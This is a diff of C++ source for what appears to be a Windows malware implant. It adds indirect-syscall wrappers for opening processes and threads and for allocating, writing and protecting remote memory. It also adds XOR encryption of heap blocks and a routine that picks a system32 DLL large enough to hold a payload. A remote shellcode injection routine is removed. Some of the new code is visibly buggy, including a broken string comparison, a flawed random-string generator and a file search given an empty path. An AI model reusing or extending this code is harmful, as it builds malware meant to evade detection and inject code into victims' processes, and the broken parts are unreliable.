@@ -30,10 +30,10 @@ namespace Ground {
                     FunctionCache[i].FunctionHash == FunctionHash
                 ) {
                     return FunctionCache[i].Function;
-                } else {
-                    return NULL;
                 }
-            }
+            } 
+
+            return NULL;
         }
 
         D_SEC( B ) BOOL CacheModule( ULONG ModuleHash, HMODULE Module ) {
@@ -59,10 +59,10 @@ namespace Ground {
                     FunctionCache[i].FunctionHash   = FunctionHash;
                     FunctionCache[i].Function       = Function;
                     return TRUE;
-                } else {
-                    return FALSE;
                 }
             }
+
+            return NULL;
         }
     }
 
@@ -77,13 +77,17 @@ namespace Ground {
             OBJECT_ATTRIBUTES ObjectAttr    = { 0 };
 
             switch( SYSCALL_METHOD ) {
-            case VelkorWinApi:
+            case VkCallWinApi:
                 ProcessHandle = VkCall<HANDLE>( XprKernel32, XPR( "OpenProcess" ), AccessRights, bInheritHandle, ProcessId ); break;
-            case VelkorNtApi: case VelkorIndirect:
+            case VkCallNtApi: case VkCallIndirect:
                 ObjectAttr             = RTL_CONSTANT_OBJECT_ATTRIBUTES( NULL, 0 );
                 ClientId.UniqueProcess = ULongToHandle( ProcessId );
+                if ( SYSCALL_METHOD == VkCallIndirect ) {
+                    NtStatus = VkSyscallExec( VkSys[eNtOpenProcess], &ProcessHandle, AccessRights, &ObjectAttr, &ClientId );
+                } else {
+                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtOpenProcess" ), &ProcessHandle, AccessRights, &ObjectAttr, &ClientId ); 
+                }
 
-                NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtOpenProcess" ), &ProcessHandle, AccessRights, &ObjectAttr, &ClientId ); 
                 SetNtStatusToSystemError( NtStatus ); break;
             }
 
@@ -97,10 +101,15 @@ namespace Ground {
             NTSTATUS NtStatus = STATUS_SUCCESS;
 
             switch( SYSCALL_METHOD ) {
-            case VelkorWinApi:
+            case VkCallWinApi:
                 bSuccess = VkCall<BOOL>( XprKernel32, XPR( "TerminateProcess" ), ProcessHandle, ExitCode ); break;
-            case VelkorNtApi: case VelkorIndirect:
-                NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtTerminateProcess" ), ProcessHandle, ExitCode );
+            case VkCallNtApi: case VkCallIndirect:
+                if ( SYSCALL_METHOD == VkCallIndirect ) {
+                    NtStatus = VkSyscallExec( VkSys[eNtTerminateProcess], ProcessHandle, ExitCode );
+                } else {
+                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtTerminateProcess" ), ProcessHandle, ExitCode );
+                }
+                
                 SetNtStatusToSystemError( NtStatus );
                 if ( NtStatus == STATUS_SUCCESS ) bSuccess = TRUE; break;
             }
@@ -148,7 +157,7 @@ namespace Ground {
             D_SEC( B ) LPPROC_THREAD_ATTRIBUTE_LIST GetAttrBuff() const { return AttributeBuff; }
         };    
 
-        D_SEC( B ) BOOL Create( PSTR Path, BOOL bInheritHandle, UINT32 Flags, PSTR CurrentDir, PROCESS_INFORMATION ProcessInf, UINT32 ParentProcId, BOOL BlockDlls ) {
+        D_SEC( B ) BOOL Create( PSTR Path, BOOL bInheritHandle, UINT32 Flags, PSTR CurrentDir, PPROCESS_INFORMATION ProcessInf, UINT32 ParentProcId, BOOL BlockDlls ) {
             VELKOR_INSTANCE
             ProcThreadAttributeList ProcAttr;
 
@@ -169,26 +178,31 @@ namespace Ground {
 
             if ( ParentProcId || BlockDlls ) SiExA.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ProcAttr.GetAttrBuff();
 
-            bSuccess = VkCall<BOOL>( XprKernel32, XPR( "CreateProcessA" ), NULL, Path, NULL, NULL, bInheritHandle, Flags, NULL, CurrentDir, &SiExA.StartupInfo, &ProcessInf );
+            bSuccess = VkCall<BOOL>( XprKernel32, XPR( "CreateProcessA" ), NULL, Path, NULL, NULL, bInheritHandle, Flags, NULL, CurrentDir, &SiExA.StartupInfo, ProcessInf );
 
             return bSuccess;
         }
     }
 
     namespace Thread {
+
         D_SEC( B ) HANDLE Create( SIZE_T StackSize, PVOID StartAddress, PVOID Parameter, ULONG Flags, PULONG ThreadIdPtr, HANDLE ProcessHandle ) {
             VELKOR_INSTANCE
             
             HANDLE    ThreadHandle = NULL;
             NTSTATUS  NtStatus     = STATUS_SUCCESS;
-
+               
             switch( SYSCALL_METHOD ) {
-            case VelkorWinApi:
-                ThreadHandle = VkCall<HANDLE>( XprKernel32, XPR( "CreateRemoteThreadEx" ),ProcessHandle, NULL, StackSize, StartAddress, Parameter, Flags, NULL, ThreadIdPtr ); break;
-            case VelkorNtApi: case VelkorIndirect:
-                ProcessHandle = NtCurrentProcess();
-                NtStatus     = VkCall<NTSTATUS>( XprNtdll, XPR( "NtCreateThreadEx" ), &ThreadHandle, THREAD_ALL_ACCESS, 0, ProcessHandle, StartAddress, Parameter, Flags, 0, StackSize, StackSize, NULL ); 
-                *ThreadIdPtr = VkCall<ULONG>( XprKernel32, XPR( "GetThreadId" ), ThreadHandle ); 
+            case VkCallWinApi:
+                ThreadHandle = VkCall<HANDLE>( XprKernel32, XPR( "CreateRemoteThreadEx" ), ProcessHandle, NULL, StackSize, StartAddress, Parameter, Flags, NULL, ThreadIdPtr ); break;
+            case VkCallNtApi: case VkCallIndirect:
+                if ( SYSCALL_METHOD == VkCallIndirect ) {
+                    NtStatus = VkSyscallExec( VkSys[eNtCreateThreadEx], &ThreadHandle, THREAD_ALL_ACCESS, 0, ProcessHandle, StartAddress, Parameter, Flags, 0, StackSize, StackSize, NULL ); 
+                } else {
+                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtCreateThreadEx" ), &ThreadHandle, THREAD_ALL_ACCESS, 0, ProcessHandle, StartAddress, Parameter, Flags, 0, StackSize, StackSize, NULL ); 
+                }
+                
+                if ( ThreadIdPtr ) C_DEF32( ThreadIdPtr ) = VkCall<ULONG>( XprKernel32, XPR( "GetThreadId" ), ThreadHandle ); 
                 SetNtStatusToSystemError( NtStatus ); break;
             }
 
@@ -204,13 +218,62 @@ namespace Ground {
             CLIENT_ID ClientId = { 0 };
 
             // switch( SYSCALL_METHOD ) {
-            // case VelkorWinApi:
+            // case VkCallWinApi:
             ThreadHandle = VkCall<HANDLE>( XprKernel32, XPR( "OpenThread" ), AccessRights, bInheritHandle, ThreadId ); 
 
             return ThreadHandle;      
         }
 
-        D_SEC( B ) ULONG Enum( VOID ) {
+        D_SEC( B ) ULONG Resume( HANDLE ThreadHandle ) {
+            VELKOR_INSTANCE
+
+            ULONG    SuspendCount = 0;
+            NTSTATUS NtStatus     = STATUS_SUCCESS;
+
+            switch( SYSCALL_METHOD ) {
+            case VkCallWinApi:
+                SuspendCount = VkCall<ULONG>( XprNtdll, XPR( "ResumeThread" ), ThreadHandle ); break;
+            case VkCallNtApi: case VkCallIndirect:
+                if ( SYSCALL_METHOD == VkCallIndirect ) {
+                    NtStatus = VkSyscallExec( VkSys[eNtResumeThread], ThreadHandle, &SuspendCount );
+                } else {
+                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtResumeThread" ), ThreadHandle, &SuspendCount );
+                }
+                
+                SetNtStatusToSystemError( NtStatus );
+                if ( NtStatus == STATUS_SUCCESS ) {
+                    return SuspendCount;
+                } else {
+                    return -1;
+                }
+            }
+            
+            return SuspendCount;            
+        }
+
+        D_SEC( B ) BOOL Terminate( HANDLE ThreadHandle, ULONG ExitCode ) {
+            VELKOR_INSTANCE
+
+            BOOL     bSuccess = FALSE;
+            NTSTATUS NtStatus = STATUS_SUCCESS;
+            
+            switch( SYSCALL_METHOD ) {
+            case VkCallWinApi:
+                bSuccess = VkCall<BOOL>( XprKernel32, XPR( "TerminateThread" ), ThreadHandle, ExitCode ); break;
+            case VkCallNtApi: case VkCallIndirect:
+                if ( SYSCALL_METHOD == VkCallIndirect ) {
+                    NtStatus = VkSyscallExec( VkSys[eNtTerminateThread], ThreadHandle, ExitCode );
+                } else {
+                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtTerminateThread" ), ThreadHandle, ExitCode );
+                }
+                SetNtStatusToSystemError( NtStatus );
+                if ( NtStatus == STATUS_SUCCESS ) bSuccess = TRUE; break;
+            }
+
+            return bSuccess;
+        }
+
+        D_SEC( B ) ULONG RndEnum( VOID ) {
             VELKOR_INSTANCE
 
             PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
@@ -228,7 +291,7 @@ namespace Ground {
             ValToFree   = SysProcInfo;
 
             bkErrorCode = VkCall<NTSTATUS>( XprNtdll, XPR( "NtQuerySystemInformation" ), SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
-            if ( bkErrorCode ) goto _VK_LEAVE;
+            if ( bkErrorCode ) goto _VK_END;
 
             SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_64( SysProcInfo ) + SysProcInfo->NextEntryOffset );
 
@@ -238,7 +301,7 @@ namespace Ground {
 
                     for ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
                         if ( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) != Velkor->Session.ThreadId ) {
-                            ThreadId = HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ); goto _VK_LEAVE;
+                            ThreadId = HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ); goto _VK_END;
                         }
                     }
                 }
@@ -246,7 +309,7 @@ namespace Ground {
                 SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_64( SysProcInfo ) + SysProcInfo->NextEntryOffset );
             }
 
-        _VK_LEAVE:
+        _VK_END:
             if ( SysProcInfo ) VkMem::Heap::Free( ValToFree, sizeof( SYSTEM_PROCESS_INFORMATION ) );
 
             return ThreadId; 
@@ -263,20 +326,30 @@ namespace Ground {
 
             if ( TokenType == VelkorTokenProcess ) {
                 switch( SYSCALL_METHOD ) {
-                case VelkorWinApi:
+                case VkCallWinApi:
                     bSuccess = VkCall<BOOL>( XprKernel32, XPR( "OpenProcessToken" ), TargetHandle, AccessRights, TokenHandle ); break;
-                case VelkorNtApi: case VelkorIndirect:
-                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtOpenProcessToken" ), TargetHandle, AccessRights, TokenHandle );
+                case VkCallNtApi: case VkCallIndirect:
+                    if ( SYSCALL_METHOD == VkCallIndirect ) {
+                        NtStatus = VkSyscallExec( VkSys[eNtOpenProcessToken], TargetHandle, AccessRights, TokenHandle );
+                    } else {
+                        NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtOpenProcessToken" ), TargetHandle, AccessRights, TokenHandle );
+                    }
+                    
                     SetNtStatusToSystemError( NtStatus );
                     if ( NtStatus != STATUS_SUCCESS ) bSuccess = FALSE; break;
                 }
             } 
             if ( TokenType == VelkorTokenThread ) {
                 switch( SYSCALL_METHOD ) {
-                case VelkorWinApi:
+                case VkCallWinApi:
                     bSuccess = VkCall<BOOL>( XprKernel32, XPR( "OpenThreadToken" ), TargetHandle, AccessRights, ( TargetHandle == NtCurrentThread() ), TokenHandle ); break;
-                case VelkorNtApi: case VelkorIndirect:
-                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtOpenThreadToken" ), TargetHandle, AccessRights, ( TargetHandle == NtCurrentThread() ), TokenHandle );
+                case VkCallNtApi: case VkCallIndirect:
+                    if ( SYSCALL_METHOD == VkCallIndirect ) {
+                        NtStatus = VkSyscallExec( VkSys[eNtOpenThreadToken], TargetHandle, AccessRights, ( TargetHandle == NtCurrentThread() ), TokenHandle );
+                    } else {
+                        NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtOpenThreadToken" ), TargetHandle, AccessRights, ( TargetHandle == NtCurrentThread() ), TokenHandle );
+                    }
+                    
                     SetNtStatusToSystemError( NtStatus );
                     if ( NtStatus != STATUS_SUCCESS ) bSuccess = FALSE; break;
                 }
@@ -314,11 +387,11 @@ namespace Ground {
                 UserStr   = (*UserNamePtr) + DomainLen;
 
                 bSuccess = VkCall<BOOL>( XprAdvapi32, XPR( "LookupAccountSidA" ), NULL, TokenUserPtr->User.Sid, UserStr, &UserLen, DomainStr, &DomainLen, &SidName );
-                if ( !bSuccess ) goto _VK_LEAVE;
+                if ( !bSuccess ) goto _VK_END;
 
                 (*UserNamePtr)[DomainLen] = '\\';
             }
-        _VK_LEAVE:
+        _VK_END:
             if ( TokenUserPtr ) VkMem::Heap::Free( TokenUserPtr, ReturnLen );
             return bSuccess;
         }
@@ -333,10 +406,16 @@ namespace Ground {
             NTSTATUS    NtStatus          = STATUS_SUCCESS;
 
             switch( SYSCALL_METHOD ) {
-            case VelkorWinApi:
-                BaseAddressIntern = VkCall<PVOID>( XprKernel32, XPR( "VirtualAllocEx" ), ProcessHandle, BaseAddress, AllocSize, AllocType, AllocProtection ); break;
-            case VelkorNtApi: case VelkorIndirect:
-                NtStatus          = VkCall<NTSTATUS>( XprNtdll, XPR( "NtAllocateVirtualMemory" ), ProcessHandle, &BaseAddress, 0, &AllocSize, AllocType, AllocProtection );
+            case VkCallWinApi:
+                BaseAddressIntern = VkCall<PVOID>( XprKernel32, XPR( "VirtualAllocEx" ), ProcessHandle, BaseAddress, AllocSize, AllocType, AllocProtection );
+                AllocSize         = PAGE_ALIGN( AllocSize ) ; break;
+            case VkCallNtApi: case VkCallIndirect:
+                if ( SYSCALL_METHOD == VkCallIndirect ) {
+                    NtStatus = VkSyscallExec( VkSys[eNtAllocateVirtualMemory], ProcessHandle, &BaseAddress, 0, &AllocSize, AllocType, AllocProtection );
+                } else {
+                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtAllocateVirtualMemory" ), ProcessHandle, &BaseAddress, 0, &AllocSize, AllocType, AllocProtection );
+                }
+
                 SetNtStatusToSystemError( NtStatus );
                 BaseAddressIntern = BaseAddress; break;
             }
@@ -351,10 +430,15 @@ namespace Ground {
             NTSTATUS NtStatus = STATUS_SUCCESS;
 
             switch( SYSCALL_METHOD ) {
-            case VelkorWinApi:
+            case VkCallWinApi:
                 bSuccess = VkCall<BOOL>( XprKernel32, XPR( "WriteProcessMemory" ), ProcessHandle, BaseAddress, Buffer, BuffSize, BytesWritten ); break;
-            case VelkorNtApi: case VelkorIndirect:
-                NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtWriteVirtualMemory" ), ProcessHandle, BaseAddress, Buffer, BuffSize, BytesWritten );
+            case VkCallNtApi: case VkCallIndirect:
+                if ( SYSCALL_METHOD == VkCallIndirect ) {
+                    NtStatus = VkSyscallExec( VkSys[eNtWriteVirtualMemory], ProcessHandle, BaseAddress, Buffer, BuffSize, BytesWritten );
+                } else {
+                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtWriteVirtualMemory" ), ProcessHandle, BaseAddress, Buffer, BuffSize, BytesWritten );
+                }
+                
                 SetNtStatusToSystemError( NtStatus );
                 if ( NtStatus == STATUS_SUCCESS ) bSuccess = TRUE; break;
             }
@@ -369,10 +453,15 @@ namespace Ground {
             NTSTATUS NtStatus = STATUS_SUCCESS;
 
             switch( SYSCALL_METHOD ) {
-            case VelkorWinApi:
+            case VkCallWinApi:
                 bSuccess = VkCall<BOOL>( XprKernel32, XPR( "VirtualProtectEx" ), ProcessHandle, BaseAddress, RegionSize, NewProtection, OldProtection ); break;
-            case VelkorNtApi: case VelkorIndirect:
-                NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtProtectVirtualMemory" ), ProcessHandle, BaseAddress, RegionSize, NewProtection, OldProtection );
+            case VkCallNtApi: case VkCallIndirect:
+                if ( SYSCALL_METHOD == VkCallIndirect ) {
+                    NtStatus = VkSyscallExec( VkSys[eNtProtectVirtualMemory], ProcessHandle, BaseAddress, RegionSize, NewProtection, OldProtection );
+                } else {
+                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtProtectVirtualMemory" ), ProcessHandle, BaseAddress, RegionSize, NewProtection, OldProtection );
+                }
+                
                 SetNtStatusToSystemError( NtStatus ); 
                 if( NtStatus == STATUS_SUCCESS ) bSuccess = TRUE; ; break;
             }
@@ -387,10 +476,15 @@ namespace Ground {
             NTSTATUS NtStatus     = STATUS_SUCCESS;
 
             switch( SYSCALL_METHOD ) {
-            case VelkorWinApi:
+            case VkCallWinApi:
                 ReturnLength = VkCall<SIZE_T>( XprKernel32, XPR( "VirtualQueryEx" ), ProcessHandle, BaseAddress, MbiPtr, sizeof( MEMORY_BASIC_INFORMATION ) ); break;
-            case VelkorNtApi: case VelkorIndirect:
-                NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtQueryVirtualMemory" ), ProcessHandle, BaseAddress, MemoryBasicInformation, MbiPtr, sizeof( MEMORY_BASIC_INFORMATION ), &ReturnLength ); 
+            case VkCallNtApi: case VkCallIndirect:
+                if ( SYSCALL_METHOD == VkCallIndirect ) {
+                    NtStatus = VkSyscallExec( VkSys[eNtQueryVirtualMemory], ProcessHandle, BaseAddress, MemoryBasicInformation, MbiPtr, sizeof( MEMORY_BASIC_INFORMATION ), &ReturnLength ); 
+                } else {
+                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtQueryVirtualMemory" ), ProcessHandle, BaseAddress, MemoryBasicInformation, MbiPtr, sizeof( MEMORY_BASIC_INFORMATION ), &ReturnLength ); 
+                }
+                
                 SetNtStatusToSystemError( NtStatus ); break;
             }
 
@@ -403,11 +497,18 @@ namespace Ground {
             BOOL     bSuccess = FALSE;
             NTSTATUS NtStatus = STATUS_SUCCESS;
 
+            VkMem::Zero( BaseAddress, SizeToFree );
+
             switch( SYSCALL_METHOD ) {
-            case VelkorWinApi:
+            case VkCallWinApi:
                bSuccess = VkCall<BOOL>( XprKernel32, XPR( "VirtualFreeEx" ), ProcessHandle, BaseAddress, SizeToFree, MEM_RELEASE ); break;
-            case VelkorNtApi: case VelkorIndirect:
-                NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtFreeVirtualMemory" ), ProcessHandle, &BaseAddress, &SizeToFree, MEM_RELEASE );
+            case VkCallNtApi: case VkCallIndirect:
+                if ( SYSCALL_METHOD == VkCallIndirect ) {
+                    NtStatus = VkSyscallExec( VkSys[eNtFreeVirtualMemory], ProcessHandle, &BaseAddress, &SizeToFree, MEM_RELEASE );
+                } else {
+                    NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtFreeVirtualMemory" ), ProcessHandle, &BaseAddress, &SizeToFree, MEM_RELEASE );
+                }
+                
                 SetNtStatusToSystemError( NtStatus );
                 if ( NtStatus == STATUS_SUCCESS ) bSuccess = TRUE; break;
             }
@@ -429,47 +530,76 @@ namespace Ground {
     
         namespace Heap {
 
-            ST_READONLY const INT NODE_SIZE = 100;
-
-            struct NODE {
+            typedef struct _NODE {
                 PVOID  Block;       
-                SIZE_T Size;       
-            };
+                SIZE_T Size;
 
-            ST_GLOBAL NODE HeapList[NODE_SIZE]; 
-            
-            D_SEC( B ) BOOL QueryCacheHeap( PVOID Ptr, SIZE_T Size ) {
-                for ( INT i = 0; i < NODE_SIZE; i++ ) {
-                    if ( HeapList[i].Block == Ptr ) {
-                        if ( Size != 0 ) HeapList->Size = Size;
+                _NODE* Next;
+            } NODE, *PNODE;
+
+            ST_GLOBAL PNODE NodePtr = { 0 };
+
+            D_SEC( B ) PNODE NodeHeadInsert( PNODE Head, PVOID Block, SIZE_T Size ) {
+                
+                PNODE NewNode = VkCall<PNODE>( 
+                    XprNtdll, XPR( "RtlAllocateHeap" ), 
+                    NtCurrentPeb()->ProcessHeap, 0, sizeof( NODE ) 
+                );
+
+                NewNode->Next  = Head;
+                NewNode->Block = Block;
+                NewNode->Size  = Size;
+
+                return NewNode; 
+            }
+
+            D_SEC( B ) BOOL NodeReSizeBlock( PNODE Head, PVOID Block, SIZE_T Size ) {
+                
+                while( Head ) {
+                    if ( Head->Block == Block ) {
+                        Head->Size = Size;
                         return TRUE;
                     }
+
+                    Head = Head->Next;
                 }
 
                 return FALSE;
             }
 
-            D_SEC( B ) BOOL AddCacheHeap( PVOID Ptr, SIZE_T Size ) {
-                for ( INT i = 0; i < NODE_SIZE; i++ ) {
-                    if ( ! HeapList[i].Block ) {
-                        HeapList[i].Block = Ptr;
-                        HeapList[i].Size  = Size;
-                        
-                        return TRUE;
+            D_SEC( B ) BOOL NodeRemoveBlock( PVOID Block, SIZE_T Size ) {
+                
+                PNODE Head = NodePtr;
+
+                while( Head ) {
+                    if ( Head->Block == Block ) {
+                        VkMem::Zero( Head->Block, Head->Size );
+                        return VkCall<BOOL>( XprNtdll, XPR( "RtlFreeHeap" ), NtCurrentPeb()->ProcessHeap, 0, Head->Block );
                     }
+                    
+                    Head = Head->Next;
                 }
 
                 return FALSE;
             }
-            
+
+            D_SEC( B ) VOID NodeDisplayAll( VOID ) {
+                
+                PNODE Head = NodePtr;
+                
+                while( Head ) {
+                    VkCall<INT>( XprMsvcrt, XPR( "printf" ), "Block => 0x%p\nSize  => %d\n\n", Head->Block, Head->Size );
+                    Head = Head->Next;
+                }
+            }
 
             D_SEC( B ) VOID HeapCrypt( PBYTE Key, ULONG KeySize ) {
+                
+                PNODE Head = NodePtr;
 
-                for ( INT i = 0; i < NODE_SIZE; i++ ) {
-                    if ( HeapList[i].Block ) {
-                        VkCall<INT>( XprMsvcrt, XPR( "printf" ), "Block => 0x%p\nSize  => %d", HeapList[i].Block, HeapList[i].Size );
-                        XorCipher( B_PTR( HeapList[i].Block ), HeapList[i].Size, Key, KeySize );
-                    }
+                while( Head ) {
+                    XorCipher( B_PTR( Head->Block ), Head->Size, Key, KeySize );
+                    Head = Head->Next;
                 }
 
                 return;
@@ -477,20 +607,11 @@ namespace Ground {
 
             D_SEC( B ) PVOID Alloc( SIZE_T Size ) {
 
-                PVOID Block = VkCall<PVOID>( XprNtdll, XPR( "RtlAllocateHeap" ), NtCurrentPeb()->ProcessHeap, 0, Size );
+                PVOID Block = VkCall<PVOID>( XprNtdll, XPR( "RtlAllocateHeap" ), NtCurrentPeb()->ProcessHeap, 0, Size );    
 
-                if ( !QueryCacheHeap( Block ) ) {
-                    VkCall<INT>( XprMsvcrt, XPR( "printf" ), "Trigger Alloc of size %d!\n", Size );
-                    if ( AddCacheHeap( Block, Size ) ) {
-                        VkCall<INT>( XprMsvcrt, XPR( "printf" ), "Block registered!\n" );
-                    }
-                } 
+                // NodePtr = NodeHeadInsert( NodePtr, Block, Size );
 
-                VkCall<INT>( XprMsvcrt, XPR( "printf" ), "Display all heaps\n" );
-                for ( INT i = 0; i < NODE_SIZE; i++ ) {
-                    if ( HeapList[i].Block )
-                    VkCall<INT>( XprMsvcrt, XPR( "printf" ), "{i} #%d Block 0x%p and Size %d\n", i, HeapList[i].Block, HeapList[i].Size );
-                }
+                // NodeDisplayAll();
 
                 return Block;
             }
@@ -499,17 +620,18 @@ namespace Ground {
 
                 PVOID ReallocatedBlock = VkCall<PVOID>( XprNtdll, XPR( "RtlReAllocateHeap" ), NtCurrentPeb()->ProcessHeap, 0, Ptr, Size );
 
-                if ( QueryCacheHeap( Ptr, Size ) ) {
-                    VkCall<INT>( XprMsvcrt, XPR( "printf" ), "ReAllocation trigger!\n" );
-                }
+                // NodeReSizeBlock( NodePtr, ReallocatedBlock, Size );
 
                 return ReallocatedBlock;
             }
 
             D_SEC( B ) BOOL Free( PVOID Ptr, SIZE_T Size ) {
+                VELKOR_INSTANCE
 
                 VkMem::Zero( static_cast<PBYTE>( Ptr ), Size );
-                BOOL bSuccess = VkCall<BOOL>( XprNtdll, XPR( "RtlFreeHeap" ), NtCurrentPeb()->ProcessHeap, 0, Ptr );
+                BOOL bSuccess = VkCall<BOOL>( XprNtdll, XPR( "RtlFreeHeap" ), NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Ptr );
+
+                // NodeRemoveBlock( Ptr, Size );
 
                 return bSuccess;
             }
@@ -548,6 +670,18 @@ namespace Ground {
             LPCWSTR End = String;
             while (*End) ++End;
             return End - String;
+        }
+
+        D_SEC( B ) INT CompareCountA( PCSTR Str1, PCSTR Str2, INT16 Count ) {
+            INT16 Idx = 0;
+
+            while (*Str1 && (*Str1 == *Str2) && Idx == Count ) {
+                ++Str1;
+                ++Str2;
+
+                Idx++;
+            }
+            return static_cast<INT>(*Str1) - static_cast<INT>(*Str2);
         }
 
         D_SEC( B ) INT CompareA( LPCSTR Str1, LPCSTR Str2 ) {
@@ -642,6 +776,20 @@ namespace Ground {
                 UnicodeString->MaximumLength = 0;
             }
         }
+
+        D_SEC( B ) PSTR GenerateRndStr( ULONG StringSize ) {
+            CHAR  Words[]    = "abcdefghijklmnopqrstuvwxyz0123456789";
+            ULONG WordsLen   = VkStr::LengthA( Words );
+            ULONG Count      = 0;
+            PSTR  RndString  = A_PTR( VkMem::Heap::Alloc( StringSize ) );
+
+            for ( INT i = 0; i < StringSize; i++ ) {
+                ULONG Count  = ( Random32() % WordsLen );
+                VkMem::Copy( RndString, &Words[Count] , sizeof( Words[Count] ) + i );
+            }
+
+            return RndString;
+        }
     }
 
     namespace File {
@@ -689,53 +837,74 @@ namespace Ground {
         }
     }
 
-    namespace Inject {
+    namespace Module {
 
-        namespace Shellcode {
-
-            D_SEC( B ) BOOL Classic( BOOL Remote, PBYTE ShellcodeBuff, SIZE_T ShellcodeSize, PULONG ThreadIdPtr , ULONG ProcessId ) {
-                
-                BOOL   bSuccess      = FALSE;
-                SIZE_T BytesWritten  = 0;
-                HANDLE ProcessHandle = NULL;
-                PVOID  BaseAddress   = NULL;
-                ULONG  OldProtection = 0;
-                
-                if ( Remote ) {
-                     ProcessHandle = VkProcess::Open( PROCESS_ALL_ACCESS, FALSE, ProcessId );
-                     if ( !ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE ) return FALSE;
-
-                     BaseAddress = VkMem::Alloc( NULL, ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, ProcessHandle );
-                     if ( !BaseAddress ) return FALSE;
-
-                     bSuccess = VkMem::Write( BaseAddress, ShellcodeBuff, ShellcodeSize, &BytesWritten, ProcessHandle );
-                     if ( !bSuccess ) return FALSE;
-
-                     bSuccess = VkMem::Protect( BaseAddress, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection, ProcessHandle );
-                     if ( !bSuccess ) return FALSE;
-
-                     VkThread::Create( 0, BaseAddress, NULL, 0, ThreadIdPtr );
-                } else {
-                     BaseAddress = VkMem::Alloc( NULL, ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
-                     if ( !BaseAddress ) return FALSE;
-
-                     bSuccess = VkMem::Write( BaseAddress, ShellcodeBuff, ShellcodeSize, &BytesWritten );
-                     if ( !bSuccess ) return FALSE;
-
-                     bSuccess = VkMem::Protect( BaseAddress, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );
-                     if ( !bSuccess ) return FALSE;
-
-                     VkThread::Create( 0, BaseAddress, NULL, 0, ThreadIdPtr );
-                }
-            }
+        D_SEC( B ) BOOL Enum( HANDLE ProcessHandle ) {
+            
         }
 
-        namespace Executable {
+        D_SEC( B ) PSTR GetRnd( SIZE_T SizeToCmp, PBOOL SmallerFull, PBOOL SmallerText ) {
+            BOOL    bSuccess           = FALSE;
+            HANDLE  FindHandle         = NULL;
+            HANDLE  FileHandle         = NULL;
+            PBYTE   FileBuffer         = NULL;
+            ULONG   FileSize           = 0;
+            ULONG   IndexMatch         = ( Random32() % 3500 );
+            ULONG   IndexStart         = 0;
+            PULONG  BytesRead          = 0;
+            CHAR    FilePath[MAX_PATH] = { 0 };
+            CHAR    DllDir[26]         = "c:\\windows\\system32\\*.dll";
 
-            D_SEC( B ) BOOL Reflective(  ) {
+            WIN32_FIND_DATAA      FindData  = { 0 };
+            PIMAGE_NT_HEADERS     ImgNtHdrs = { 0 };
+            PIMAGE_SECTION_HEADER SecHeader = { 0 };
 
-            }
+            FindHandle = VkCall<HANDLE>( XprKernel32, XPR( "FindFirstFileA" ), FilePath, &FindData );
 
+            do {
+                if ( IndexMatch == IndexStart ) {
+                    VkStr::ConcatA( FilePath, "c:\\windows\\system32\\" );
+                    VkStr::ConcatA( FilePath, FindData.cFileName );
+
+                    FileHandle = VkCall<HANDLE>( XprKernel32, XPR( "CreateFileA" ), FilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL );
+                    if ( !FileHandle || FileHandle == INVALID_HANDLE_VALUE ) goto _VK_END;
+
+                    FileSize = VkCall<ULONG>( XprKernel32, XPR( "GetFileSize" ), FileHandle, 0 );
+                    if ( !FileSize ) goto _VK_END;
+
+                    FileBuffer = B_PTR( VkMem::Heap::Alloc( FileSize ) );
+                    if ( !FileBuffer ) goto _VK_END;
+
+                    bSuccess = VkCall<BOOL>( XprKernel32, XPR( "ReadFile" ), FileHandle, FileBuffer, FileSize, BytesRead, NULL );
+                    if ( !bSuccess ) goto _VK_END;
+
+                    ImgNtHdrs = (PIMAGE_NT_HEADERS)( FileBuffer + ( (PIMAGE_DOS_HEADER)FileBuffer )->e_lfanew );
+                    SecHeader = IMAGE_FIRST_SECTION( ImgNtHdrs );
+
+                    if ( FileSize >= SizeToCmp ) C_DEF08( SmallerFull ) = TRUE;
+
+                    for ( INT i = 0; i < ImgNtHdrs->FileHeader.NumberOfSections; i++ ) {
+                        if ( XPR( A_PTR( SecHeader[i].Name ) ) == XPR( ".text" ) ) {
+                            if ( SecHeader[i].SizeOfRawData >= SizeToCmp ) C_DEF08( SmallerText ) == TRUE; break;
+                        }
+                    }
+
+                    if ( SmallerFull || SmallerText ) {
+                        break;
+                    } else {
+                        VkMem::Heap::Free( FileBuffer, FileSize );
+                    }
+                }
+
+                IndexStart++;
